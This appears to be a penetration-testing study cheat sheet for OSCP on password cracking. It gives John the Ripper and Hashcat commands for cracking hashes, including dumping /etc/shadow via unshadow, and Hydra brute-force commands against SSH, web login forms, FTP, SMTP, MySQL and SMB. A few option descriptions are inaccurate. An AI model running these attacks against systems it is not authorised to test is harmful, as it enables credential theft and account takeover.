# Password Cracking Tools (John, Hashcat, Hydra)

**Source:** gabb4r/OSCP Notes Integration

## Quick Intro

- **John the Ripper**: Fast hash cracking, offline, supports most formats
- **Hashcat**: GPU-accelerated, supports millions of hash types
- **Hydra**: Online brute force/dictionary attack against services
- Strategy: Identify hash type → crack offline → test credentials online

## John the Ripper

### Installation

```bash
# Linux package
apt-get install john john-data

# Compile from source
git clone https://github.com/openwall/john.git
cd john/src && ./configure && make
```

### Basic Usage

```bash
# Single hash
john --format=sha512 hash.txt

# Hash file with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Unshadow /etc/passwd and /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Identifying Hash Types

```bash
# John auto-detects most formats, but can specify:
john --format=md5 hash.txt
john --format=sha1 hash.txt
john --format=sha256 hash.txt
john --format=sha512 hash.txt
john --format=bcrypt hash.txt
john --format=phpass hash.txt (WordPress)
john --format=mysql hash.txt
john --format=oracle hash.txt

# List all supported formats
john --list=formats
```

### Advanced Options

```bash
# Incremental mode (brute force)
john --incremental=LowerCase hash.txt

# Rules-based attack (modify wordlist entries)
john --wordlist=rockyou.txt --rules=Single hash.txt
john --wordlist=rockyou.txt --rules=Jumbo hash.txt

# Custom rules
john --wordlist=rockyou.txt -external:filter hash.txt

# Specific character set
john --incremental=Alnum hash.txt

# Session resumption
john --session=mysession hash.txt
john --restore=mysession

# Multiple hash formats in one file
john --format=dynamic_1506 hash.txt
```

### Wordlist Sources

```bash
# Rockyou.txt (most common)
/usr/share/wordlists/rockyou.txt

# Other Kali lists
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/metasploit/unix_users.txt

# Generate custom
crunch 6 8 0123456789abcdef -o wordlist.txt
```

## Hashcat

### Installation

```bash
# Download binary
wget https://hashcat.net/files/hashcat-6.2.6.7z
7z x hashcat-6.2.6.7z

# Or package
apt-get install hashcat

# GPU support required (NVIDIA/AMD)
```

### Hash Mode Identification

```bash
# Common hash modes
0 = MD5
100 = SHA1
1400 = SHA256
1700 = SHA512
3200 = bcrypt
5500 = NetNTLMv2

# List all modes
hashcat -h | grep "NTLM"
hashcat --help | grep "bcrypt"
```

### Basic Usage

```bash
# Dictionary attack
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Brute force (8 char lowercase)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Show cracked hashes
hashcat -m 0 hash.txt rockyou.txt --show
```

### Attack Modes

```bash
# 0 = Dictionary
hashcat -m 1400 -a 0 hash.txt wordlist.txt

# 1 = Combination
hashcat -m 1400 -a 1 hash.txt dict1.txt dict2.txt

# 3 = Brute force
hashcat -m 1400 -a 3 hash.txt ?l?l?l?l

# 6 = Hybrid dict + mask
hashcat -m 1400 -a 6 hash.txt wordlist.txt ?d?d?d?d

# 7 = Hybrid mask + dict
hashcat -m 1400 -a 7 hash.txt ?d?d?d?d wordlist.txt
```

### Character Sets

```bash
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digits (0-9)
?s = special (!@#$%^&*)
?a = all printable ASCII
?b = all hex (0-255)

# Examples
?l?l?l?l = 4 char lowercase
?u?l?l?d?d?d = Uppercase+2 lowercase+3 digits
?d?d?d?d = 4 digit PIN
```

### Advanced Options

```bash
# Rules-based
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple wordlists
hashcat -m 0 -a 0 hash.txt wordlist1.txt wordlist2.txt

# Continue cracking
hashcat -m 0 -a 0 hash.txt rockyou.txt --status

# Limit cracking time
hashcat -m 0 -a 0 hash.txt rockyou.txt --runtime=3600

# Show password quality (entropy)
hashcat -m 0 -a 0 hash.txt rockyou.txt --show --left
```

### Performance Tuning

```bash
# Workload (1-4, higher = faster but uses more memory)
hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4

# Kernel loops
hashcat -m 0 -a 0 hash.txt rockyou.txt -n 1024

# GPU support
hashcat -m 0 -a 0 hash.txt rockyou.txt -d 1 (CUDA)
hashcat -m 0 -a 0 hash.txt rockyou.txt -d 2 (OpenCL)
```

## Hydra - Online Brute Force

### Installation

```bash
apt-get install hydra
# Or: apt-get install hydra-gtk (GUI)
```

### SSH Brute Force

```bash
# Dictionary attack
hydra -l admin -P rockyou.txt ssh://<IP>

# Multiple users
hydra -L users.txt -P rockyou.txt ssh://<IP>

# Custom port
hydra -l admin -P rockyou.txt ssh://<IP>:2222

# Parallel threads
hydra -l admin -P rockyou.txt ssh://<IP> -t 4
```

### HTTP POST Login

```bash
# Basic form brute force
hydra -l admin -P rockyou.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# With cookie support
hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/:user=^USER^&pass=^PASS^:S=Dashboard"

# Multiple login endpoints
hydra -L users.txt -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pwd=^PASS^:F=Invalid"
```

### FTP Brute Force

```bash
# Basic
hydra -l admin -P rockyou.txt ftp://<IP>

# Verbose output
hydra -l admin -P rockyou.txt ftp://<IP> -v
```

### SMTP Brute Force

```bash
# Mail server
hydra -l admin -P rockyou.txt smtp://<IP>

# With port
hydra -l admin -P rockyou.txt smtp://<IP>:587
```

### MySQL Brute Force

```bash
# Database login
hydra -l root -P rockyou.txt mysql://<IP>

# Custom port
hydra -l root -P rockyou.txt mysql://<IP>:3306
```

### SMB/Windows Brute Force

```bash
# Windows share
hydra -l admin -P rockyou.txt smb://<IP>

# Domain auth
hydra -l DOMAIN\\admin -P rockyou.txt smb://<IP>
```

### Advanced Hydra Options

```bash
# Dry run (test without actual connection)
hydra -l admin -P rockyou.txt <IP> http-post-form "..." -t

# Verbose (show each attempt)
hydra -l admin -P rockyou.txt <IP> http-post-form "..." -v

# Debug (detailed connection info)
hydra -l admin -P rockyou.txt <IP> http-post-form "..." -d

# Resume session
hydra -l admin -P rockyou.txt <IP> http-post-form "..." -R

# Specific port
hydra -l admin -P rockyou.txt -s 8080 <IP> http-post-form "..."

# Timeout per attempt
hydra -l admin -P rockyou.txt <IP> ssh -o ConnectTimeout=10
```

## Hash Type Detection

### Using hash-identifier

```bash
# Install
apt-get install hash-identifier

# Identify hash
hash-identifier < hash.txt
# Or: echo "hash_here" | hash-identifier
```

### Manual Identification

```bash
# MD5: 32 hex chars
5d41402abc4b2a76b9719d911017c592

# SHA1: 40 hex chars
aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d

# SHA256: 64 hex chars
2c26b46911185131006ba49cb2e32c8cce4902c797253b0aaf467534684859d7

# SHA512: 128 hex chars
cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e

# bcrypt: starts with $2a$, $2b$, $2y$, $2x$
$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW

# NTLM: 32 hex chars but from Windows
8846f7eaee8fb117ad06bdd830b7586c
```

## Custom Wordlist Generation

```bash
# Crunch - pattern-based
crunch 6 8 0123456789abcdef -o wordlist.txt
crunch 6 8 "abc123!@#" -o wordlist.txt

# Cewl - website scraping
cewl -d 3 -m 5 http://target.com -w wordlist.txt

# Combine wordlists
cat dict1.txt dict2.txt > combined.txt

# Remove duplicates
sort wordlist.txt | uniq > wordlist_clean.txt
```

## Strategy

1. **Identify hash type** → hash-identifier or john --format
2. **Attempt offline crack** → john or hashcat with rockyou.txt
3. **If no match** → brute force with hashcat (GPU accelerated)
4. **Test credentials** → hydra against live service
5. **Document findings** → plain password + hash value + cracking time

## Detection & Testing Checklist

- [x] Hash type identification
- [x] John dictionary attack
- [x] John incremental brute force
- [x] Hashcat GPU acceleration
- [x] Hashcat rule-based attack
- [x] Hydra SSH brute force
- [x] Hydra HTTP POST form brute force
- [x] Hydra FTP/SMTP/MySQL brute force
- [x] Custom wordlist generation
- [x] Combine and optimize wordlists

## Related Notes

- [[02-Scanning/Port-Enumeration]] → Service identification
- [[03-Enumeration/MySQL-Enumeration]] → Hash extraction
- [[05-Post-Exploitation]] → Credential hunting
- [[06-Exploitation/Privilege-Escalation]] → Sudo password cracking
